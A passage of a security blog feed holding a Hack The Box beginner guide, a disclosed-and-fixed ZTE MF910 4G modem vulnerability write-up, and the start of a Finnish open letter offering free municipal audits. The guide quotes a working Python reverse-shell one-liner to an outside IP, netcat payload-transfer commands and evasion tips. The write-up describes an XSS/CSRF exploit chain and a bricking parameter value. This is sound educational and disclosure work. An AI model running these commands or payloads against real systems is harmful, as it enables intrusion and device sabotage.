+At my day job I try to ensure that the software we produce is secure. Sometimes it involves doing penetration testing, but I&#8217;m not doing the fancy Red Teaming stuff at all. If I find technical security flaws or process issues, they are fixed and there&#8217;s rarely any public disclosure.&nbsp; There might be a review and retrospective, but no one pays me to chain cool ROP gadgets to&nbsp;prove that a buffer overflow can be very dangerous. Now&nbsp;<a href="https://www.hackthebox.eu/">Hackthebox.eu</a>&nbsp;has provided me with an excuse to do that other kind of hacking too.</p>
+<h1>How to get started?</h1>
+<p>You&#8217;ll need some basic tools. <a href="https://www.kali.org/">Kali Linux</a> in a virtual machine and some HTTP proxy (<a href="https://portswigger.net/burp">Burp</a> or <a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project">ZAP</a>) are sufficient for most of the things. Inside Kali, <strong><em>nmap</em></strong>, <em><strong>dirb</strong></em>, <em><strong>nikto</strong></em> and <a href="https://www.metasploit.com/">Metasploit</a> have been my most useful tools so far.<br />
+To get an idea about the hacking (as well as some tips), watch <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA">IppSec&#8217;s great videos</a> about pwning the retired machines. For example, watch the&nbsp;&nbsp;<a href="https://www.youtube.com/watch?v=NMGsnPSm8iw">video about pwning Popcorn</a>.</p>
+<h1>Pwning machines</h1>
+<p>It appears that first you need to recon the machine by running <em><strong>nmap</strong></em> and <strong><em>dirb</em></strong> and other scanners to find something exploitable. Often it&#8217;s a web application, but it can be something else too. When you find &#8220;something&#8221;, try to exploit it somehow. Get some ideas about how to find &amp; exploit that &#8220;something&#8221; from <em>High on Coffee</em>:&nbsp;<a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">penetration testing cheat sheet.</a><br />
+I&#8217;m not a huge fan of having to guess something artificial, but that&#8217;s not totally unrealistic. I&#8217;m not very good at that it seems, but hopefully I&#8217;ll get better. Just keep in mind, there are steps where you may need to simply guess something.</p>
+<h2>Getting from user to root</h2>
+<p>I suck at pwning Windows machines, which is something I intend to practice next, but<br />
+these links offer some ideas for the Linux/Unix systems:<br />
+<a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ </a><a href="https://www.rebootuser.com/?p=1758">https://www.rebootuser.com/?p=1758</a><br />
+<a href="https://www.rebootuser.com/?p=1623">https://www.rebootuser.com/?p=1623</a><br />
+Of course you need to understand how Linux systems work in the first place. Crontab, file system permissions, sudo and all that other basic admin stuff.</p>
+<h1>Binary reverse engineering challenges</h1>
+<p>In order to reverse binaries in the challenges, you need some knowledge of x86 assembly. The easier ones are not really difficult, but if you can&#8217;t read assembler code, it will be quite hard.<br />
+I have tried&nbsp;<a href="https://x64dbg.com/">x64dbg</a>,&nbsp;<a href="https://www.hopperapp.com/">Hopper</a>, <a href="https://rada.re/r/">radare2</a>, <a href="https://www.hex-rays.com/products/ida/support/download_freeware.shtml">IDA (free version)</a> and the good old <a href="http://www.ollydbg.de/version2.html">OllyDbg</a> so far. I also downloaded <a href="https://binary.ninja/">Binary Ninja</a>, but haven&#8217;t really tried it yet. While I don&#8217;t want to debate the merits these tools, I have found x64dbg most to my liking so far. Gives me the same vibes I felt with the ancient Turbo Debugger about 25 years ago.<br />
+My strategy so far has been straightforward:<br />
+1. Analyze what the program actually does.<br />
+2. See if there are interesting strings inside and how they are used.<br />
+3. Try to get rid of obfuscation and anti-debugging stuff by rewriting the code.<br />
+4. Try to make sense of the remaining final checking code. (single step, breakpoints etc.)<br />
+5. Perhaps write a small Python script to reveal the flag.<br />
+Some links which might be useful:<br />
+<a href="https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2">https://www.u235.io/single-post/2017/07/23/Simplistic-Binary-Patching-With-Radare2 </a><a href="https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/">https://erichokanson.me/2015/04/17/reverse-engineering-with-ollydbg/</a><br />
+Simply replacing the annoying stuff with NOP instructions is a good starting strategy. If the state of the system (registers and flags) are not affected, this works pretty well.<br />
+<img decoding="async" class="alignnone size-full wp-image-1280" src="http://165.232.69.132/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png" alt="radare2" width="1854" height="1002" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06.png 1854w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-300x162.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1030x557.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-768x415.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1536x830.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-1500x811.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.40.06-705x381.png 705w" sizes="(max-width: 1854px) 100vw, 1854px" />Get rid of the pesky antidebugging code!</p>
+<h1>It&#8217;s not real life</h1>
+<p>I have had fun with <strong>Hack the box</strong> (as well as some frustration also), but it has been extremely interesting to peek at what other people are doing on the machines. Here are some of my findings.</p>
+<h2>Scripters are running wild</h2>
+<p>Here&#8217;s a sample of process list from one of the machines:</p>
+<blockquote><p>www-data 2555 0.0 0.3 18904 3604 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
+www-data 2556 0.0 0.3 19004 3464 ? S 10:24 0:00 /bin/bash ./LinEnum.sh -t<br />
+www-data 1428 0.0 0.0 4508 704 ? S 10:15 0:00 sh -c cd /tmp; python -c &#8216;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket<br />
+.SOCK_STREAM);s.connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);&#8217; 2&gt;&amp;1<br />
+www-data 1429 0.0 0.9 39980 9668 ? S 10:15 0:00 python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.<br />
+connect((&#8220;10.10.15.228&#8221;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#8220;/bin/sh&#8221;,&#8221;-i&#8221;]);<br />
+www-data 1430 0.0 0.0 4508 784 ? S 10:15 0:00 /bin/sh -i<br />
+www-data 1443 0.0 1.2 256212 12588 ? S 10:15 0:00 /usr/sbin/apache2 -k start<br />
+www-data 1493 0.0 0.6 32168 6680 ? S 10:16 0:00 python -c import pty;pty.spawn(&#8220;/bin/bash&#8221;)<br />
+www-data 1494 0.0 0.3 18216 3064 pts/3 Ss 10:16 0:00 /bin/bash<br />
+www-data 1501 0.0 0.0 4508 752 ? S 10:16 0:00 sh -c cd /tmp; python -c &#8220;import pty; pty.spawn(&#8216;/bin/bash&#8217;)&#8221; 2&gt;&amp;1<br />
+www-data 1502 0.0 0.6 32168 6780 ? S 10:16 0:00 python -c import pty; pty.spawn(&#8216;/bin/bash&#8217;)</p></blockquote>
+<p>In a real system, this should light up the IDS/SIEM like a christmas tree. Even a cursory look by the administrator with<strong><em> ps -Af</em></strong> would immediately reveal that something bad is happening.<br />
+Therefore, in a real pentest (of course neither of us would do any illegal hacking), the tester would run something innocent, like <em>testrunner.sh</em>, which would hide the nefarious activities from immediate discovery. It would be in some obscure innocent folder or completely reside in memory. Most certainly, a professional wouldn&#8217;t upload anything named &#8220;<em>reverse-shell.php</em>&#8221; to the server.<br />
+Reverse shells still would show up in network connections unless masquaraded with some network magic, but that process list is just plain funny <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="🙂" class="wp-smiley" style="height: 1em; max-height: 1em;" /><br />
+It&#8217;s quite different also for the reverse engineering. Especially reversing unknown (potential) malware is something I would approach with extreme caution. Just single-stepping and setting breakpoints in a debugger would not be enough to contain a malicious binary.<br />
+So if you want to practice for real life scenarios, I would suggest that instead of going straight for the flag, you should practice the same precautions and steps you would need in the real world. Having fun is perfectly fine, nothing wrong with that.</p>
+<h1>Don&#8217;t get accidentally exposed!</h1>
+<p>As a first step, don&#8217;t hack with your important machine. As a minimum, shut down the VPN when not using it and use a virtual machine (or a burner machine) when you connect to a potentially hostile unknown network.<br />
+A lot of people seem to be running <strong><em>python -m SimpleHTTPServer</em></strong>&nbsp;or something similar to host the payloads to be downloaded by the target machine. Please consider that there are other hackers working on the same machine and if you expose your hard disk to the target machine, someone else could download something interesting from your computer. Like, say, your private ssh key. <strong><em>SimpleHTTPServer</em></strong> is super handy, but it does not care about security!<br />
+Either work with something which only allows downloading your <em>exploit.exe</em> or immediately shut down the server after your tools have been downloaded on the target.<br />
+Here&#8217;s a way to do it with <em><strong>netcat</strong></em>:</p>
+<blockquote><p>1. On the target, start listening:<br />
+nc -l 8080 &gt; bash.sh<br />
+2. On your attacker machine, send your evil payload:<br />
+nc -w 3 localhost 8080 &lt; LinEnum.sh</p></blockquote>
+<p>Whether this trick works depends on the firewall rules, but as a minimal precaution, shut down your server on your machine immediately after the file transfer.</p>
+<h1>Some final tips and ideas</h1>
+<h2>Tip 1: Learn Python</h2>
+<p>Python is great for quickly cooking up some automation and helper programs. You don&#8217;t need static types or classes to structure your code. But make no mistake: Python is definitely a serious programming language and not just a &#8220;scripting language&#8221;.<br />
+Here&#8217;s an example from a script I wrote to automate guessing passwords and users for a certain service.<br />
+<img decoding="async" class="alignnone size-full wp-image-1279" src="https://rot.fi/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png" alt="Screen-Shot-2018-03-07-at-14.39.05.png" width="2246" height="1500" srcset="/wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405.png 2246w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-300x200.png 300w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1030x688.png 1030w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-768x513.png 768w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1536x1026.png 1536w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-2048x1368.png 2048w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-1500x1002.png 1500w, /wp-content/uploads/2018/03/Screen-Shot-2018-03-07-at-14.39.05-2869612859-1520426857405-705x471.png 705w" sizes="(max-width: 2246px) 100vw, 2246px" /></p>
+<h2>Tip 2: Keep notes</h2>
+<p>Keep notes on the challenges and machines. I have a subfolder for each machine with more or less incoherent notes on what I have found and what I haven&#8217;t yet figured out about the machine. I may put this stuff on a private git repository to get it better organized.</p>
+<h2>Tip 3: Use the google</h2>
+<p>This is kind of obvious, but enumerate the versions and search for possible exploits in <a href="https://www.exploit-db.com/">exploit-db</a> and other places. I precompiled some exploits already and kept the binary executables in addition to source code. I might need some sort of Excel sheet or something to keep track of these if there are more to come.</p>
+<h1>Happy hacking!</h1>
+<p>It&#8217;s worth mentioning that <strong>Hack The Box </strong>contains&nbsp;more than just binary reverse engineering and pwning machines.&nbsp;I left out advice for some challenges, like steganography, which I haven&#8217;t really done. I&#8217;m not qualified to give any advice on that.<br />
+If you now feel the itch to try out some &#8220;real&#8221; hacking, please do. The best way to learn is by doing and <strong>Hack The Box</strong> is a great platform to practice on.</p>
+]]></content:encoded>
+					
+		
+		
+			</item>
+		<item>
+		<title>WAN-to-LAN exploitation of 4G broadband modem</title>
+		<link>/wan-to-lan-exploitation-of-4g-broadband-modem/</link>
+					<comments>/wan-to-lan-exploitation-of-4g-broadband-modem/#respond</comments>
+		
+		<dc:creator><![CDATA[woltage]]></dc:creator>
+		<pubDate>Tue, 07 Nov 2017 15:17:23 +0000</pubDate>
+				<category><![CDATA[Exploitation]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[Writeup]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=720</guid>
+
+					<description><![CDATA[Nowadays, wireless 4G connections are fairly popular way of connecting to internet. Most of the internet service providers provide at least some form of 4G-package and usually they also include a free 4G-modem along with the 4G-package. These free devices are usually just re-branded versions of other vendor's devices. This blog post examines various vulnerabilities of a re-branded ZTE MF910 4G modem.]]></description>
+										<content:encoded><![CDATA[<h1>Introduction</h1>
+<p>Nowadays, wireless 4G connections&nbsp;are&nbsp;fairly popular way of connecting to internet. Most of the internet service providers provide at least some form of 4G-package and usually they also include&nbsp;a free 4G-modem along with the 4G-package. These free devices are usually just re-branded versions of other vendor&#8217;s devices.&nbsp;This blog post examines various vulnerabilities of a re-branded ZTE MF910 4G modem.<br />
+The research was started by connecting the ZTE-device to a computer normally and a connection was initiated in a way the manual instructed. A moment later, the administrative web-interface&nbsp;revealed itself with a default password of <em>&#8216;1234&#8217;.</em><br />
+<img decoding="async" class="alignnone size-full wp-image-797" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29.png" alt="Screen Shot 2017-05-05 at 0.13.29.png" width="2208" height="1532" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29.png 2208w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-300x208.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-1030x715.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-768x533.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-1536x1066.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-2048x1421.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-1500x1041.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-13-29-705x489.png 705w" sizes="(max-width: 2208px) 100vw, 2208px" /></p>
+<h1>WAN-to-LAN-attack: Send SMS-messages&nbsp;by chaining CSRF, XSS, weak default&nbsp;credentials and another CSRF</h1>
+<p>The features&nbsp;provided by the web interface were examined and it was discovered that goform_set_cmd_process-functionality is used to send various commands to the modem. This&nbsp;functionality uses a single http-request in which various values are supplied with GET-parameters.<br />
+The available commands were then examined and one of the most interesting commands was possibility&nbsp;to send SMS messages to given&nbsp;phone numbers. This command however requires that the user is authenticated to the web interface. It also requires that the &#8220;Referrer&#8221;-header of the http-request matches IP-address of the modem, thus making CSRF-attacks which originate from third-party domain impossible.<br />
+<img decoding="async" class="alignnone size-full wp-image-799" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18.png" alt="Screen Shot 2017-05-05 at 0.15.18.png" width="2382" height="540" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18.png 2382w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-300x68.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-1030x234.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-768x174.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-1536x348.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-2048x464.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-1500x340.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-15-18-705x160.png 705w" sizes="(max-width: 2382px) 100vw, 2382px" /><br />
+Easiest way to bypass the previously mentioned protections would be finding XSS-vulnerabilities which allow sending requests with proper &#8220;Referrer&#8221;-value. Thus began the search for a XSS-vulnerability.<br />
+None were found in the goform_set_cmd_process, however a single reflected XSS&nbsp;was found in goform_get_cmd_process-functionality that is used to fetch data from the modem. The web interface uses GET-parameter named &#8220;cmd&#8221; to specify which command the functionality should execute. By inserting a malicious javascript-payload to this GET-parameter, the server places this payload to the http-response thus triggering an XSS on the web interface.<br />
+This XSS on the&nbsp;goform_get_cmd_process-functionality did not require any authentication and had no CSRF-protection, which made it a great initial attack point for further attacks.</p>
+<p><img decoding="async" class="alignnone size-full wp-image-815" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45.png" alt="Screen Shot 2017-05-05 at 0.57.45.png" width="2078" height="770" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45.png 2078w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-300x111.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-1030x382.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-768x285.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-1536x569.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-2048x759.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-1500x556.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-57-45-705x261.png 705w" sizes="(max-width: 2078px) 100vw, 2078px" /><br />
+Next by crafting a special javascript payload for the XSS, it could be instructed to send http-request towards the SMS-functionality. As the&nbsp;request was sent from a page hosted by the modem via XSS, the &#8220;Referrer&#8221;-header value is now set to modem&#8217;s IP-address thus allowing access to the command.<br />
+The SMS-functionality however still required that the user is authenticated. As the modem does not force users to change the default password and uses same password for every device, this was bypassed simply by using the XSS to send a login-request with default password.<br />
+However a new problem was encountered during the exploitation attempt. The XSS allowed only a short payload which did not have enough space for sending the login-request and the SMS-message. This was&nbsp;bypassed fairly easily&nbsp;by splitting the payload in half. A&nbsp;second-stage payload contains the javascript that sends the login-command and the SMS-command.&nbsp;This second-stage payload is hosted on an external domain. A very simple first-stage payload was then supplied to the initial XSS and its only purpose is to load the second-stage payload script.</p>
+<p><div id="attachment_803" style="width: 2440px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-803" decoding="async" class="alignnone size-full wp-image-803" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03.png" alt="Screen Shot 2017-05-05 at 0.50.03.png" width="2430" height="442" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03.png 2430w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-300x55.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-1030x187.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-768x140.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-1536x279.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-2048x373.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-1500x273.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-50-03-705x128.png 705w" sizes="(max-width: 2430px) 100vw, 2430px" /><p id="caption-attachment-803" class="wp-caption-text">First-stage payload</p></div></p>
+<p><div id="attachment_806" style="width: 1680px" class="wp-caption alignnone"><img aria-describedby="caption-attachment-806" decoding="async" class="alignnone size-full wp-image-806" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25.png" alt="Screen Shot 2017-05-05 at 0.51.25.png" width="1670" height="292" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25.png 1670w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-300x52.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-1030x180.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-768x134.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-1536x269.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-1500x262.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-51-25-705x123.png 705w" sizes="(max-width: 1670px) 100vw, 1670px" /><p id="caption-attachment-806" class="wp-caption-text">Second-stage payload</p></div></p>
+<p>Finally, the exploitation succeeded and by executing a CSRF-attack from a page hosted in internet, the full exploit chain was executed and the&nbsp;SMS-messages were&nbsp;sent to phone numbers specified by the adversary. Exploitation of this kind of&nbsp;attack is fairly severe as it requires nearly no user interaction and the initial attack can begin from WAN-side.<br />
+https://youtu.be/BLIWNBp-u34<br />
+An example attack scenario would be for example, when the user clicks on a link on e.g Facebook, the payload will trigger and the exploit will login to the system and send tons of SMS messages to whichever number that adversary&nbsp;defined in the payload. This will then lead to a situation where monetary consequences are caused to the owner of the modem and the targeted phone number will be filled with spam-messages.<br />
+<img decoding="async" class="alignnone size-full wp-image-824" src="http://165.232.69.132/wp-content/uploads/2017/05/pasted-image-at-2017_05_04-11_41-pm.png" alt="Pasted image at 2017_05_04 11_41 PM.png" width="770" height="588" srcset="/wp-content/uploads/2017/05/pasted-image-at-2017_05_04-11_41-pm.png 770w, /wp-content/uploads/2017/05/pasted-image-at-2017_05_04-11_41-pm-300x229.png 300w, /wp-content/uploads/2017/05/pasted-image-at-2017_05_04-11_41-pm-768x586.png 768w, /wp-content/uploads/2017/05/pasted-image-at-2017_05_04-11_41-pm-705x538.png 705w" sizes="(max-width: 770px) 100vw, 770px" /></p>
+<h1>Modem Takeover</h1>
+<p>In practice, a hacker will be able to change any settings from the MF910 device via the previously introduced CSRF-based exploit chain.&nbsp;For example, an adversary can hijack the web interface and take over the modem by using the exploit chain and the functionality which the modem uses for changing passwords.<br />
+<img decoding="async" class="alignnone size-full wp-image-809" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49.png" alt="Screen Shot 2017-05-05 at 0.52.49.png" width="2532" height="202" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49.png 2532w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-300x24.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-1030x82.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-768x61.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-1536x123.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-2048x163.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-1500x120.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-52-49-705x56.png 705w" sizes="(max-width: 2532px) 100vw, 2532px" /></p>
+<h1>Stored XSS</h1>
+<p>When creating new contacts, a &#8220;groupchoose&#8221;-parameter can be used to store malicious JavaScript payload&nbsp;in a&nbsp;contact that will be run each time contact page is opened.<br />
+<img decoding="async" class="alignnone size-full wp-image-821" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47.png" alt="Screen Shot 2017-05-05 at 1.04.47.png" width="3092" height="490" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47.png 3092w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-300x48.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-1030x163.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-768x122.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-1536x243.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-2048x325.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-1500x238.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-04-47-705x112.png 705w" sizes="(max-width: 3092px) 100vw, 3092px" /><br />
+This vulnerability&nbsp;is also exploitable via WAN-to-LAN-attack by using the previously introduced exploit&nbsp;chain.</p>
+<h1><img decoding="async" class="alignnone size-full wp-image-817" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36.png" alt="Screen Shot 2017-05-05 at 1.03.36.png" width="1452" height="984" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36.png 1452w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36-300x203.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36-1030x698.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36-768x520.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-1-03-36-705x478.png 705w" sizes="(max-width: 1452px) 100vw, 1452px" /></h1>
+<h1>Persistent denial-of-service</h1>
+<p>The&nbsp;goform_set_cmd_process-functionality contains a command &#8220;SET_WEB_LANGUAGE&#8221;, which is used to specify language of the&nbsp;web interface. By setting value of this command to <em>fi&#8221;, brick</em>, the modem will be bricked and the user can’t access the web interface&nbsp;anymore. Only way to recover from this&nbsp;denial-of-service condition is to do a&nbsp;factory reset&nbsp;on the modem.<br />
+<img decoding="async" class="alignnone size-full wp-image-789" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-04-19-at-9-07-10.jpg" alt="Screen Shot 2017-04-19 at 9.07.10.jpg" width="3360" height="2046"><br />
+The vulnerability can be exploited through a simple CSRF, however it requires that the &#8220;Referrer&#8221;-header matches IP-address of the modem. Thus, the previously introduced&nbsp;exploit chain can be used to exploit also this in a WAN-to-LAN-attack.<br />
+<img decoding="async" class="alignnone size-full wp-image-812" src="http://165.232.69.132/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08.png" alt="Screen Shot 2017-05-05 at 0.54.08.png" width="2186" height="98" srcset="/wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08.png 2186w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-300x13.png 300w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-1030x46.png 1030w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-768x34.png 768w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-1536x69.png 1536w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-2048x92.png 2048w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-1500x67.png 1500w, /wp-content/uploads/2017/05/screen-shot-2017-05-05-at-0-54-08-705x32.png 705w" sizes="(max-width: 2186px) 100vw, 2186px" /></p>
+<h1>Conclusion</h1>
+<p>Current state of security in IoT-devices seems miserable (&#8220;The S in IoT stands for security&#8221;). This product did not prove otherwise. However when these vulnerabilities were reported to the manufacturer, the manufacturer reacted very quickly&nbsp;and all findings were fixed within couple of days, so there is light at the end of the tunnel. New firmware versions which fix the vulnerabilities were released to the original device and to the re-branded devices.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/wan-to-lan-exploitation-of-4g-broadband-modem/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Kuntahaaste</title>
+		<link>/team-rot-3-suomi-kuntahaaste/</link>
+					<comments>/team-rot-3-suomi-kuntahaaste/#respond</comments>
+		
+		<dc:creator><![CDATA[woltage]]></dc:creator>
+		<pubDate>Sun, 10 Sep 2017 18:21:08 +0000</pubDate>
+				<category><![CDATA[Informative]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[TietoturvallinenSuomi]]></category>
+		<guid isPermaLink="false">http://blog.rot.fi/?p=837</guid>
+
+					<description><![CDATA[Toivottavasti tämä avoin kirje tavoittaa kunnan päättäjät, tietoturvapäälliköt, tai muut kuntien vastaavissa tehtävissä toimivat henkilöt. Tarjoamme teille mielenkiintoista kokeilua, jonka avulla voitte parantaa kuntanne tietoturvaa ilmaiseksi.]]></description>
+										<content:encoded><![CDATA[<p>Hei!<br />
+Toivottavasti tämä avoin kirje tavoittaa kunnan päättäjät, tietoturvapäälliköt, tai muut kuntien vastaavissa tehtävissä toimivat henkilöt. Tarjoamme teille mielenkiintoista kokeilua, jonka avulla <strong>voitte parantaa kuntanne tietoturvaa ilmaiseksi.</strong><br />
+Olemme Team Rot. Tietoturva on intohimomme ja teemme teknisiä tietoturvatarkastuksia järjestelmiin ja laitteistoihin sekä vapaa-ajallamme että työksemme. Olemme osallistuneet lukuisiin haavoittuvuuspalkinto-ohjelmiin (engl. &#8220;Bug Bounty&#8221;) maailmanlaajuisesti ja tiimimme jäsenet ovat tunnettuja myös kansainvälisesti. <strong>Nyt haluamme parantaa tietoturvaa Suomen kunnissa ja tarjoamme yhdelle Suomen kunnalle työpanostamme &#8211; ilmaiseksi</strong>, jotta Suomi saadaan turvallisemmaksi.<br />
+Esimerkkejä tiimin tietoturva-aiheisista tuotoksista:</p>
+<ul>
+<li>Jarmon loistava raportti Blind XSS:stä LähiTapiolalle: <a href="https://hackerone.com/reports/159498">https://hackerone.com/reports/159498</a></li>
+<li>Jarmon haastattelu Bugcrowd Bug Bounty alustalla: <a href="https://blog.bugcrowd.com/researcher-spotlight-putsi">https://blog.bugcrowd.com/researcher-spotlight-putsi</a></li>
+<li>Jarkon artikkeli siitä miten valvontakamera otetaan haltuun: <a href="https://blog.rot.fi/2017/02/17/tp-link-tl-sc3171g-ip-camera-r00t/">https://blog.rot.fi/2017/02/17/tp-link-tl-sc3171g-ip-camera-r00t/</a></li>
+<li>Iiron seminaariesitys Tesla Motorsin lähdekoodin saamisesta: <a href="https://www.youtube.com/watch?v=2a8EgCeBOzw">https://www.youtube.com/watch?v=2a8EgCeBOzw</a></li>
